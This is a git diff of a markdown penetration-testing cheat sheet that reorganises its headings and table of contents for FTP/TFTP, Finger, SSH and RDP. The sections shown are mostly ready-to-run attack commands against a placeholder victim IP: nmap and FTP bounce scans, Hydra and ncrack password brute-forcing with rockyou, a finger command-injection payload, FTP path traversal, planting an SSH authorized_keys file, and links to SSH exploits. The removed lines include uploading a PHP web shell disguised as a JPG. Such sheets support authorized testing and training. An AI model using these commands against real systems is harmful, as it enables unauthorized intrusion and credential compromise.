@@ -1,131 +1,26 @@
 - [Amazon_S3](#Amazon_S3)
 - [DNS](#DNS)
-  - [Interacting with a DNS Server](#Interacting-with-a-DNS_Server)
-    - [How to find the A record of а domain](#How-to-find-the-A-record-of-а-domain)
-    - [How to check the NS records of a domain](#How-to-check-the-NS-records-of-a-domain)
-    - [How to query the SOA record of a domain](#How-to-query-the-SOA-record-of-a-domain)
-    - [How to find the MX records of a domain](#How-to-find-the-MX-records-of-a-domain)
-    - [How to find all of the available DNS records of a domain.](#How-to-find-all-of-the-available-DNS-records-of-a-domain)
-    - [How to check the using of a specific DNS Server](#How-to-check-the-using-of-a-specific-DNS-Server)
-    - [How to check the Reverse DNS Lookup](#How-to-check-the-Reverse-DNS-Lookup)
-  - [Zone transfer with dig](#Check-Zone-transfer-with-dig )
-  - [Automatic scan DNSrecon](#Automatic-scan-DNSrecon)
-  - [Automatic scan DNSenum](#Automatic-scan-DNSenum)
 - [FTP/TFTP](#FTP/TFTP)
-  - [nmap ftp scan](#nmap_ftp_scan)
-  - [metasploit tftp](#metasploit_tftp)
-  - [Upload_attemps](#Upload_attemps)
-  - [FTP path traversal](path_traversal)
-  - [Windows dir change](#Windows_dir_change_with_~1)
 - [Finger](#Finger)
-  - [enumeration script](#enumeration_script)
-  - [finger comandline](#finger_comandline)
-  - [ssh keygen](#ssh_keygen)
 - [HTTP](#HTTP)
-  - [Directory scanning](#Directory_scanning)
-  - [Subdomain_scanning](#Subdomain_scanning)
-  - [Nikto scan](#Nikto_scan)
-  - [WhatWeb](#WhatWeb)
-  - [Cewl](#Cewl)
-  - [nmap](#nmap)
-    - [heartbleed](#heartbleed)
-    - [vuln](#vuln)
-    - [smb](#smb)
-    - [shellshock](#shellshock)
 - [SQL](#SQL)
-  - [sql nmap scan](#sql_nmap_scan)
-  - [sql metasploit](#sql_metasploit)
-  - [mysql commands](#mysql_commands)
-  - [mssql server config file](#mssql_server_config_file)
 - [ORACLE](#Oracle)
-  - [SIDs enumeration](SIDs-enumeration)
-  - [Brute force credentials](Brute-force-credentials)
-  - [Oracle Exploitation](Exploitation)
 - [NFS](#NFS)
-  - [Basic NFS command](#Basic_command)
-  - [Create temp folder](#Create_temp_folder)
-  - [mount](#mount)
-  - [nmap scan](#nmap_scan)
 - [SSH](#SSH)
-  - [SSH metasploit enum](#SSH_metasploit_enum)
-  - [SSH bruteforce](#SSH_bruteforce)
-  - [ssh keygen](#ssh_keygen)
-  - [SSH CVE 1](#SSH_CVE_1)
-  - [SSH CVE 2](#SSH_CVE_2)
 - [RDP](#RDP)
-  - [Connect to RPD](connect_RDP)
-  - [nmap rdp scan](nmap_rdp_scan])
-  - [Bruteforce RDP credentials](#bruteforce_rdp_credentials)
 - [RPC](#RPC)
-  - [nmap](#nmap)
-  - [metasploit scan](#metasploit)
 - [SNMP](#SNMP)
-  - [SNMP Description](#SNMP_Description)
-  - [MIB Tree Description](#MIB_Tree)
-  - [snmpwalk](#snmpwalk)
-  - [SNMP_CHECK](#SNMP_CHECK)
 - [SNMP](#SNMP)
-  - [Netcat](#Netcat)
-  - [Telnet](#Telent)
-  - [Metasploit](#Metasploit)
-  - [smtp snum script](#smtp-user-enum)
-  - [Nmap](#nmap)
-  - [Bruteforce](#Bruteforce)
 - [POP3](POP3)
-  - [Telnet](#Telnet)
 - [SMB](#SMB)
-  - [nmap scipt](#nmap)
-  - [rpcclient](#rpcclient)
-  - [smbmap](#smbmap)
-    - [smb_file_upload](#smb_file_upload)
-  - [enum4linux](#enum4linux)
-  - [eternal blue](#eternal_blue)
-    - [nmap script for eternal blue testing](#mmap_script)
-    - [metasploit modules for eternal blue testing](#eternal_blue_metasploit)
-    - [others tools for eternal blue testing](#tools_for_eternalblue)
-  - [msfconsole smb payloads](#msfconsole)
-  - [null Session](#null_session)
-  - [Hydra bruteforce](#Bruteforce)
-  - [SMB perl script](#SMB_perl_script)
 - [Redis](#Redis)
 - [VNC](#VNC)
-  - [VNC nmap scan](#VNC_nmap)
-  - [VNC exploit](#VNC_exploit)
-  - [MSF VNC auth none](#MSF_VNC_auth_none)
-  - [MSF VNC password attack](#MSF_VNC_password_attack)
-  - [MSFVenom VNC payload](#MSFVenom_VNC_payload)
-  - [VNC post exploitation](#VNC_post_exploitation)
-  - [VNC_access](#VNC_access)
 - [Webdav](#Webdav)
-  - [webdav_scanner](#webdav_scanner)
-  - [metasploit](#metasploit)
-  - [webdav_via_curl](#webdav_via_curl)
-  - [change_extension](#change_extension)
-  - [Semicolen_file_extension_bypassing](#Semicolen_file_extension_bypassing)
-  - [cadaver_tool](#cadaver_tool)
-  - [Use_PUT_method](#Use_PUT_method)
 - [MongoDB](#MongoDB)
 - [Port knocking](#Port_knocking)
-  - [Port knocking configure file](#configure_file)
-  - [Port knocking bash script](#bash_script)
-  - [Port knocking nmap port knocking](#nmap_port_knocking)
-  - [Port knocking hping port knocking](#hping_port_knocking)
 - [Shell Shock](#Shellshock)
-  - [Shellshock manual_exploitation](#manual_exploitation)
-  - [Shellshock SSH exploitaion](#exploitaion_SSH)
-  - [Shellshock with nmap script](#nmap_script)
-  - [Shellshock_via_smb](#smb)
-  - [Shellshock tool](#Shellshock_tool)
 - [Apache Tomcat](#Apache-Tomcat)
-  - [Get tomcat-users.xml](#Get-tomcat-users)
-  - [Upload war file via command line](#Upload-war-file-via-commandline)
 - [Active Directory](#Active-Directory)
-  - [Kerberos](#Kerberos)
-    - [Kerberos brute force](#Kerberos-brute-force)
-    - [ASREPRoast](#ASREPRoast)
-    - [Kerberoasting](#Kerberoasting)
-    - [Overpass The Hash/Pass The Key](#Overpass-The-Hash/Pass-The-Key)
-    - [Pass the key](Pass-the-key)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -247,33 +142,43 @@ A Records: Give us IP-address for a particular domain
 --------------------------------------------------------------------------------------------------------------------------------
 # FTP/TFTP
 
-### nmap_ftp_scan:
+Standard network protocol used for the transfer of computer files from a server to a client on a computer network. FTP is built on a client-server model architecture using separate control and data connections between the client and the server
+
+## nmap FTP scan:
 - nmap -p 21 -sV [victim_ip]
 - nmap -sV -sC [victim_ip] -p 21
 - namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
-- nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21] 127.0.0.1
+- nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21]
 - nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
 - nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]
 
-### metasploit_tftp
+### metasploit ftp module
 ```
 use auxiliary/scanner/tftp/tftpbrute
 ```
-### Upload_attemps
+## FTP upload and donwload file
+
+- Download file from FTP
 ```
-ftp> put shell.php shell.jpg
-ftp> PUT shell.php shell.jpg
-ftp> send 
-  (local-file) shell.php
-  (remote-file) shell.jpg
+ftp> get file_name
 ```
-### path_traversal
+
+- Upload file to ftp
+```
+ftp> put file_name
+```
+- In same case we need to turn on binary mode:
+```
+ftp> binary
+```
+
+## FTP path_traversal
 ```
 dir ../
 ls ../
 ```
 
-### Windows_dir_change_with_~1
+## FTP change directory on Windows server
 ```
 cd /Docume~1/
 cd /Progra~1/
@@ -281,15 +186,16 @@ cd /Progra~1/
 --------------------------------------------------------------------------------------------------------------------------------
 # Finger
 
-### enumeration_script
-- https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl
-
-### finger_comandline 
+## finger user enumeration from commandline 
 ```
 finger [username]@[ip]
 
 finger "|/bin/ls -a /@[victim_ip]"
 ```
+
+### finger enumeration script
+- https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl
+
 --------------------------------------------------------------------------------------------------------------------------------
 # HTTP 
 
@@ -491,18 +397,19 @@ nmap -sV --script=nfs-showmount [victim_ip]
 --------------------------------------------------------------------------------------------------------------------------------------
 # SSH 
 
-## SSH_metasploit_enum
+## SSH enumeration metasploit module
 ```
 use auxiliary/scanner/ssh/ssh_enumusers
 set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
 run
 ```
-## SSH_bruteforce
+## SSH hydra bruteforce
 ```
 hydra -v -V -l root -P password-file.txt [victim_ip] ssh
 hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
 ```
-## ssh_keygen
+
+## ssh keygen process
 ```
 ssh-keygen
 mkdir /mnt/user_name/.ssh
@@ -510,26 +417,25 @@ touch /mnt/user_name/.ssh/authorized_keys
 cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
 ssh use_name@[victim_ip
 ```
-
-## SSH_CVE_1
+## usefull ssh exploits
 - https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py
 
-## SSH_CVE_2
 - https://github.com/g0tmi1k/debian-ssh
+
 --------------------------------------------------------------------------------------------------------------------------------------
 # RDP
 
-## connect_RDP
+## Connect to remote desktop 
 ```
 rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]
 ```
 
-## nmap_rdp_scan
+## rdp nmap scan
 ```
 nmap -p 3389 --script rdp-ntlm-info [victim_ip]
 ```
 
-## bruteforce_rdp_credentials
+## bruteforce rdp credentials
 ```
 hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
 ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
